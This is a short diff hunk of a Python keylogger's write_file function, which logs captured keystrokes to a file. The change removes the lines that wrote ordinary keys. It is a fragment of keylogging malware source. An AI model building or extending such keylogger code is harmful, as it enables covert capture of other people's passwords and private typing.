@@ -24,8 +24,6 @@ def write_file(keys):
             k = str(key).replace("'","")
             if k.find("space") > 0:
                 f.write('\n')
-            elif key.find("Key") == -1:
-                f.write(k)
 # This adds to a nice, clean log file for keylogging. If needed, change "w" to "a" (for creating a new file)
 
 
